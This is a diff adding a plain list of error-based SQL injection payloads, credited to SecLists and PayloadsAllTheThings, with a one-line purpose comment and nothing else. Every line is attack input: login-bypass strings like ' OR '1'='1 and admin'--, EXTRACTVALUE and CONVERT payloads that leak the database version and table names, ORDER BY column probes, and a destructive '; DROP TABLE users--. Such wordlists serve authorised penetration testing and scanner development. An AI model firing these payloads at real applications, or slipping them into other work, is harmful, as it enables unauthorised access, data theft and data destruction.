@@ -1,0 +1,54 @@
+# SQLi Error-Based Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Trigger visible SQL error messages in the application response.
+'
+''
+`
+')
+"))
+'--
+'/*
+'#
+" --
+"/*
+"#
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"/*
+') OR ('1'='1
+') OR ('1'='1'--
+")) OR (("1"="1
+admin'--
+admin' --
+admin'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1--
+" OR 1=1#
+1 OR 1=1
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+' AND 1=1--
+' AND 1=2--
+'; SELECT 1--
+'; DROP TABLE users--
+'; SELECT * FROM information_schema.tables--
+1; SELECT @@version--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' GROUP BY 1,2--
+1' GROUP BY 1,2,3--
+' HAVING 1=1--
+' HAVING 1=0--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+,1
+1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
